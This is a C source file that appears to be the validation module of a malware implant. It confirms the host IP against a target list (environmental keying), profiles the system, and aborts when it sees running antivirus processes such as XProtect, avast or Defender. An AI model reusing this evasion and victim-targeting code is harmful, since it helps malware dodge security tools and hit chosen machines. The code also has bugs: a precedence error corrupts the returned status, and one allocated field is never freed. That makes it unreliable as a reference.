#include <ifaddrs.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/utsname.h>

#include "validators.h"

#define PATH_TO_FILE "/"

/**
 * ----------------- TODO -----------------
 *  1. Make a standard for returning
 *     values such as errors or success
 * 
 *  2. Make a standard for logging and
 *     debugging 
 * 
 *  3. Make functions prettier
 * 
 *  4. Make environmental keying
 * 
 */

const char* KNOWN_AV_LIST[] = {"XProtect", "avast", "avg", "kaspersky", "defender"};
const int KNOWN_AV_NUM = 5;



// FIXED - BUG SOMETHING WRONG WITH CHECKING THE NETWORK - FIXED
static int check_in_network(int af, const char *ip_str, const char *network, const int prefix) {
    if(af == AF_INET) {
        uint32_t ip, net, mask;
        inet_pton(AF_INET, ip_str, &ip);
        inet_pton(AF_INET, network, &net);
        ip = ntohl(ip);
        net = ntohl(net);

        mask = 0xFFFFFFFFu << (32 - prefix);
        return (ip & mask) == (net & mask);
    }

    else {
        unsigned char ip[IPV6_ADDR_LEN], net[IPV6_ADDR_LEN], mask[IPV6_ADDR_LEN];

        int network_bytes = (prefix / 8);
        int network_bits = (prefix % 8);
        
        inet_pton(AF_INET6, ip_str, &ip);
        inet_pton(AF_INET6, network, &net);

        memset(mask, 0, IPV6_ADDR_LEN);
        for(int i = 0; i < network_bytes; i++) {
            mask[i] = 0xFF;
        }

        if(network_bits > 0 && network_bytes < IPV6_ADDR_LEN ) {
            mask[network_bytes] = 0xFF << (8-network_bits);
        }
        
        for(int i = 0; i < IPV6_ADDR_LEN; i++) {
            if ((ip[i] & mask[i]) != (net[i] & mask[i])) {
                return 0;
            }
        }

        return 1;
    }
}

static int check_ip_list(int family, char *ip_addr) {
    char *correct_ip_list[] = CORRECT_IP_LIST;
    int correct_ip_list_cnt = sizeof(correct_ip_list) / sizeof(char *);

    for(int i = 0; i < correct_ip_list_cnt; i++) {
        char *correct_ip = correct_ip_list[i];
        char *ptr;
        if((ptr = strstr(correct_ip, "/"))) {
            char network[MAX_IP_LENGTH];
            memset(network, 0, MAX_IP_LENGTH);
            strncpy(network, correct_ip, ptr-correct_ip);
            if(check_in_network(family, ip_addr, network, atoi(ptr+1))) {
                return 1;
            }
        }
        else {
            if(strncmp(correct_ip, ip_addr, strlen(correct_ip)) == 0) {
                return 1;
            }
        }
    }

    return 0;
}

static host_check_status_t check_if_host_ip_is_correct(host_profile *host_info) {
    char ip_addr[MAX_IP_LENGTH];
    struct ifaddrs *ifaddr, *ifa;
    int s, family;
    unsigned long sockaddr_struct_size;


    if((s = getifaddrs(&ifaddr)) != 0) {
        return ERR_IFADDR_FAILED;
    }

    for(ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;
        
        family = ifa->ifa_addr->sa_family;
        if(family == AF_INET) {
            sockaddr_struct_size = sizeof(struct sockaddr_in);
        } else if(family == AF_INET6){
            sockaddr_struct_size = sizeof(struct sockaddr_in6);
        }
        else {
            continue;
        }

        s = getnameinfo(ifa->ifa_addr, sockaddr_struct_size, ip_addr, MAX_IP_LENGTH, NULL, 0, NI_NUMERICHOST);
        if (s != 0){
            return ERR_NAMEINFO_FAILED;
        }

        if (strcmp(ip_addr, IPV4_LOOPBACK_ADDR) == 0 || strcmp(ip_addr, IPV6_LOOPBACK_ADDR) == 0)
            continue;
        
        // see if ip address is in 
        if(check_ip_list(family, ip_addr)) {
            strncpy(host_info->interface_name, ifa->ifa_name, MAX_INTERFACE_LEN);
            strncpy(host_info->host_ip, ip_addr, MAX_IP_LENGTH);
            host_info->family = family;
            freeifaddrs(ifaddr);
            return CORRECT_HOST;
        }

    }

    freeifaddrs(ifaddr);

    return ERR_NO_IP_MATCH;
}

static void get_system_info(struct utsname *system_info) {
    if(uname(system_info) != 0) {
        // fail maybe do it some other way?
        perror("Uname failed");
        exit(1);
    }
    return;
}

Profile *get_profile() {
    struct utsname system_info;
    get_system_info(&system_info);

    Profile *profile = (Profile *) malloc(sizeof(Profile));
    memset(profile, 0, sizeof(Profile));

    profile->kernel = strdup(system_info.sysname);
    profile->kernel_release = strdup(system_info.release);
    profile->kernel_version = strdup(system_info.version);
    profile->arch = strdup(system_info.machine);

    return profile;
}

void free_profile(Profile **pProfile) {
    if(!pProfile || !*pProfile) return;

    Profile *profile = *pProfile;

    free(profile->kernel);
    free(profile->kernel_release);
    free(profile->kernel_version);

    free(profile);
    *pProfile = NULL;
}



void uninstall() {

}

host_check_status_t check_if_host_is_correct(host_profile *host_info) {
    host_check_status_t s;

    if((s = check_if_host_ip_is_correct(host_info) != CORRECT_HOST)) {
        return s;
    }

    // other checks later...
    return CORRECT_HOST;
}

void check_for_antivirus() {
    FILE *file = popen("ps -A", "r");

    if(!file) {
        fprintf(stderr, "popen failed\n");
        exit(EXIT_FAILURE);
    }

    char buffer[256];
    while(fgets(buffer, sizeof(buffer), file) != NULL) {
        for(int i = 0; i < KNOWN_AV_NUM; i++) {
            if(strstr(buffer, KNOWN_AV_LIST[i]) != NULL) {
                fprintf(stderr, "Antivirus %s found. Abort.\n", KNOWN_AV_LIST[i]);
                pclose(file);
                exit(EXIT_FAILURE);
            }
        }
    }
    
    pclose(file);
    return;
}

const char *get_validator_status_message(host_check_status_t status) {
    switch (status) {
        case CORRECT_HOST:
            return "Host is correct";
        case ERR_NO_IP_MATCH:
            return "Host IP is not in valid IP list";
        case ERR_IFADDR_FAILED:
            return "Failed to get interface addresses";
        case ERR_NAMEINFO_FAILED:
            return "Failed to get translate IP into a string";
        default:
            return "Unknown error";
    }
}